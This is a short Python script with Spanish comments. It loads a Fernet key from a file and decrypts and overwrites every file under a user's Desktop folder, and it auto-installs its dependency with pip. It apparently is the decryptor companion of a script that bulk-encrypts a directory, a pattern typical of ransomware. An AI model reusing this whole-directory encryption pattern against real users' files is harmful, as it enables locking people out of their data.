import multiprocessing
import os
import subprocess
import pkg_resources
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import simpledialog

REQUIRED_PACKAGES = [
    'cryptography'
]

# Verifica si el paquete necesario está instalado, si no, lo instala.
for package in REQUIRED_PACKAGES:
    try:
        dist = pkg_resources.get_distribution(package)
        print('{} ({}) está instalado'.format(dist.key, dist.version))
    except pkg_resources.DistributionNotFound:
        print('{} NO está instalado'.format(package))
        subprocess.call(['pip', 'install', package])

# Carga la clave de encriptación de un archivo.
def cargar_key():
    return open('key.key', 'rb').read()

# Desencripta un archivo dado con una clave dada.
def decrypt(item, key):
    f = Fernet(key)
    with open(item, 'rb') as file:
        encrypted_data = file.read()
    decrypted_data = f.decrypt(encrypted_data)
    with open(item, 'wb') as file:
        file.write(decrypted_data)

# Obtiene todos los archivos en un directorio dado.
def get_all_files_in_directory(dir_path):
    files_list = []
    for root, dirs, files in os.walk(dir_path):
        for file in files:
            files_list.append(os.path.join(root, file))
    return files_list

# Si este script se ejecuta como el principal, desencripta todos los archivos en el directorio dado.
if __name__ == '__main__':
    path_to_encrypt = 'C:\\Users\\[nombre de usuario]\\Desktop'  # Reemplaza [nombre de usuario] con tu nombre de usuario
    all_files = get_all_files_in_directory(path_to_encrypt)

    key = cargar_key()
    with multiprocessing.Pool() as pool:
        pool.starmap(decrypt, [(file, key) for file in all_files])
